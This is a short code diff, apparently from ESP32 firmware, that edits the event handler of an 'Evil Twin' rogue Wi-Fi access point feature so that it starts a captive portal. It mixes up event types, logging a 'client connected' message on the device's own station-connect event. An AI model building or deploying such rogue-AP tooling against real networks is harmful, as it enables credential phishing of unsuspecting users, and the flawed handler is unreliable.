@@ -213,10 +213,14 @@ static void eviltwin_wifi_event_handler(void *arg, esp_event_base_t event_base,
                                          int32_t event_id, void *event_data) {
     if (!g_eviltwin_running) return;
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
+
         wifi_event_sta_connected_t *ev = (wifi_event_sta_connected_t *)event_data;
-        ESP_LOGI(TAG, "🔗 Client connected to Evil Twin AP! MAC: %02x:%02x:%02x:%02x:%02x:%02x",
-            ev->mac[0], ev->mac[1], ev->mac[2],
-            ev->mac[3], ev->mac[4], ev->mac[5]);
+        ESP_LOGI(TAG, "🔗 Client connected to Evil Twin AP! BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
+            ev->bssid[0], ev->bssid[1], ev->bssid[2],
+            ev->bssid[3], ev->bssid[4], ev->bssid[5]);
+    
+        // Start captive portal — use bssid from event data
+        start_captive_portal(ev->bssid);
         hw_led_blink(2, 50);
     }
 }
